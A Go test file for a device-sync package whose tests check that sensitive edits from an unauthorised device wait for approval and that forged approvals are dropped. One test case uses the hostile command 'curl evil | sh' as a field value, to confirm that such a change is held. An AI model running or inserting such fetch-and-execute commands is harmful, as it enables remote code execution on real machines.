package komandosync

import (
	"testing"
	"time"
)

func TestTwoDevicesEndToEnd(t *testing.T) {
	w := newWorld(t)
	mac, _ := w.account("MacBook")
	phone := w.pair(mac, "iPhone", true)

	srv, err := mac.Create(TypeServer, field("name", "prod-db"), field("address", "10.0.0.5"), field("port", "5432"))
	must(t, err)
	note, err := phone.Create(TypeNote, field("text", "rotate the password in March"))
	must(t, err)
	w.syncAll(mac, phone)

	for _, d := range []*Device{mac, phone} {
		if got := value(t, d, srv, "address"); got != "10.0.0.5" {
			t.Errorf("%s: address = %q", d.Name, got)
		}
		if got := value(t, d, note, "text"); got != "rotate the password in March" {
			t.Errorf("%s: note = %q", d.Name, got)
		}
		if n, ok := d.DeviceName(phone.ID()); !ok || n != "iPhone" {
			t.Errorf("%s: phone name = %q %v", d.Name, n, ok)
		}
		if n, ok := d.DeviceName(mac.ID()); !ok || n != "MacBook" {
			t.Errorf("%s: mac name = %q %v", d.Name, n, ok)
		}
	}
	if mac.Account() != phone.Account() || mac.Account() != mac.List().Entries[0].Hash() {
		t.Fatal("account ID is not the hash of entry 1 on both devices")
	}
}

func TestThreeDevicesConverge(t *testing.T) {
	w := newWorld(t)
	mac, _ := w.account("MacBook")
	phone := w.pair(mac, "iPhone", true)
	ipad := w.pair(phone, "iPad", true) // added by the second device
	devs := []*Device{mac, phone, ipad}

	id, err := mac.Create(TypeServer, field("name", "web1"), field("address", "10.0.0.1"))
	must(t, err)
	w.syncAll(devs...)
	// Concurrent edits of different fields and of the same field.
	_, err = phone.Update(id, field("description", "front end"))
	must(t, err)
	w.clk.add(time.Millisecond)
	_, err = ipad.Update(id, field("port", "2222"))
	must(t, err)
	w.clk.add(time.Millisecond)
	_, err = mac.Update(id, field("port", "2200")) // newest clock wins
	must(t, err)
	w.syncAll(devs...)

	for _, d := range devs {
		f, ok := d.Get(id)
		if !ok || f["description"] != "front end" || f["port"] != "2200" || f["address"] != "10.0.0.1" {
			t.Errorf("%s: %v", d.Name, f)
		}
		if len(d.Waiting()) != 0 {
			t.Errorf("%s: %d changes still waiting", d.Name, len(d.Waiting()))
		}
		if len(d.List().Members) != 3 {
			t.Errorf("%s: %d members", d.Name, len(d.List().Members))
		}
	}
}

func TestChangesThatWaitForAPerson(t *testing.T) {
	w := newWorld(t)
	phone, _ := w.account("iPhone")
	mini := w.pair(phone, "Mac mini", false) // no Touch ID: no authority key
	id, err := phone.Create(TypeServer, field("name", "prod-db"), field("address", "10.0.0.5"))
	must(t, err)
	w.syncAll(phone, mini)

	cases := []struct {
		name  string
		field Field
		waits bool
	}{
		{"address moves a secret", field("address", "203.0.113.9"), true},
		{"which secret it uses", field("secret", "other-pass"), true},
		{"what runs", field("command", "curl evil | sh"), true},
		{"rename changes who is reached", field("name", "prod-db-2"), true},
		{"looser rule", field("protected", "false"), true},
		{"description applies by itself", field("description", "main database"), false},
		{"stricter rule applies by itself", field("protected", "true"), false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			before := value(t, phone, id, c.field.Name)
			ref, err := mini.Update(id, c.field)
			must(t, err)
			w.syncAll(phone, mini)
			got := value(t, phone, id, c.field.Name)
			if c.waits {
				if got != before {
					t.Fatalf("applied without a yes: %q", got)
				}
				ws := phone.Waiting()
				if len(ws) != 1 || ws[0].Ref != ref || ws[0].Changes[0].New != c.field.Value {
					t.Fatalf("waiting list: %+v", ws)
				}
				must(t, phone.Approve(ref))
				w.syncAll(phone, mini)
			}
			for _, d := range []*Device{phone, mini} {
				if got := value(t, d, id, c.field.Name); got != c.field.Value {
					t.Fatalf("%s: %q after the yes, want %q", d.Name, got, c.field.Value)
				}
			}
		})
	}
	if err := mini.Approve(WriteRef{}); err != ErrNoAuthority {
		t.Fatalf("a device without an authority key approved: %v", err)
	}
}

func TestNewRecordAndDeleteWait(t *testing.T) {
	w := newWorld(t)
	phone, _ := w.account("iPhone")
	mini := w.pair(phone, "Mac mini", false)
	id, err := mini.Create(TypeServer, field("name", "new-box"), field("address", "10.1.1.1"))
	must(t, err)
	w.syncAll(phone, mini)
	if _, ok := phone.Get(id); ok {
		t.Fatal("a new server applied without a yes")
	}
	ws := phone.Waiting()
	if len(ws) != 1 || !ws[0].Create {
		t.Fatalf("waiting: %+v", ws)
	}
	must(t, phone.Approve(ws[0].Ref))
	w.syncAll(phone, mini)
	if _, ok := mini.Get(id); !ok {
		t.Fatal("approved server missing on the Mac")
	}
	del, err := mini.Delete(id)
	must(t, err)
	w.syncAll(phone, mini)
	if _, ok := phone.Get(id); !ok {
		t.Fatal("delete applied without a yes")
	}
	must(t, phone.Approve(del))
	_, err = mini.Update(id, field("description", "edit after delete"))
	must(t, err)
	w.syncAll(phone, mini)
	for _, d := range []*Device{phone, mini} {
		if _, ok := d.Get(id); ok {
			t.Fatalf("%s: deleted record is back", d.Name)
		}
	}
	if got := phone.DroppableMarkers(); len(got) != 1 || got[0] != id {
		t.Fatalf("droppable markers: %v", got)
	}
}

func TestNameHeldByAnotherRecordShowsReplaces(t *testing.T) {
	w := newWorld(t)
	phone, _ := w.account("iPhone")
	mini := w.pair(phone, "Mac mini", false)
	_, err := phone.Create(TypeServer, field("name", "prod-db"), field("address", "10.0.0.5"))
	must(t, err)
	w.syncAll(phone, mini)
	_, err = mini.Create(TypeServer, field("name", "prod-db"), field("address", "203.0.113.9"))
	must(t, err)
	w.syncAll(phone, mini)
	ws := phone.Waiting()
	if len(ws) != 1 || ws[0].Replaces != "prod-db" {
		t.Fatalf("want a waiting newcomer shown as replacing prod-db, got %+v", ws)
	}
}

func TestForgedApprovalsAreDropped(t *testing.T) {
	w := newWorld(t)
	phone, _ := w.account("iPhone")
	mini := w.pair(phone, "Mac mini", false)
	id, err := phone.Create(TypeServer, field("name", "db"), field("address", "10.0.0.5"))
	must(t, err)
	w.syncAll(phone, mini)
	ref, err := mini.Update(id, field("address", "203.0.113.9"))
	must(t, err)
	// The Mac signs an "approval" with its sync key: it has no authority
	// key, so every device drops it.
	yes := &Change{Kind: kindApproval, Record: id, Type: TypeServer, Target: ref}
	sig, err := sign(mini.keys.Sync, labelApproval, approvalBytes(mini.account, yes))
	must(t, err)
	yes.Approval = sig
	_, err = mini.write(yes)
	must(t, err)
	rep, err := phone.Sync()
	must(t, err)
	if rep.Rejected != 1 || value(t, phone, id, "address") != "10.0.0.5" {
		t.Fatalf("forged approval: rejected=%d address=%s", rep.Rejected, value(t, phone, id, "address"))
	}
}

func TestFutureStampWaitsForItsTime(t *testing.T) {
	w := newWorld(t)
	a, _ := w.account("A")
	b := w.pair(a, "B", true)
	id, err := a.Create(TypeNote, field("text", "now"))
	must(t, err)
	w.syncAll(a, b)
	a.hlc.Wall = w.clk.now().Add(MaxSkew * 4).UnixMilli() // a clock far ahead
	_, err = a.Update(id, field("text", "from the future"))
	must(t, err)
	rep, err := b.Sync()
	must(t, err)
	if rep.Deferred != 1 || value(t, b, id, "text") != "now" {
		t.Fatalf("future write applied early: %+v %q", rep, value(t, b, id, "text"))
	}
	w.clk.add(MaxSkew * 4)
	_, err = b.Sync()
	must(t, err)
	if got := value(t, b, id, "text"); got != "from the future" {
		t.Fatalf("after its time: %q", got)
	}
}

func TestKitMustBeTypedBackBeforeSync(t *testing.T) {
	w := newWorld(t)
	d := w.device("Mac", true)
	kit, err := d.CreateAccount()
	must(t, err)
	_, err = d.Sync()
	wantErr(t, err, ErrKitNotConfirmed)
	_, err = d.Create(TypeNote)
	wantErr(t, err, ErrKitNotConfirmed)
	wantErr(t, d.ConfirmKit([2]string{"AAAA", "BBBB"}), ErrKitTypo)
	must(t, d.ConfirmKit(typeBack(kit)))
	_, err = d.Sync()
	must(t, err)
}

func TestMacWithoutTouchIDCannotTurnSyncOn(t *testing.T) {
	w := newWorld(t)
	_, err := w.device("Mac mini", false).CreateAccount()
	wantErr(t, err, ErrNoAuthority)
}

func TestConcurrentListAppendLosesCleanly(t *testing.T) {
	w := newWorld(t)
	a, _ := w.account("A")
	b := w.pair(a, "B", true)
	c := w.pair(a, "C", true)
	w.syncAll(a, b, c)
	// b starts an entry on the head it knows; a adds one first.
	req, err := c.AskAuthority(mustSigner(t))
	must(t, err)
	en := b.nextEntry(Body{Action: ActReplaceAuthority, AuthOf: c.ID(), NewAuth: req.NewAuth})
	en.Sigs = []EntrySig{{Role: RoleAuthAsk, Device: c.ID(), Sig: req.Ask}, {Role: RoleAuthProof, Device: c.ID(), Sig: req.Proof}}
	must(t, en.signEntry(b.keys.Authority, RoleAuthority, b.ID(), 0))
	must(t, a.Remove(c.ID()))
	wantErr(t, b.appendEntry(en), ErrListConflict)
	_, err = b.Sync()
	must(t, err)
	if b.List().Members[c.ID()] != nil {
		t.Fatal("b missed a's removal")
	}
}
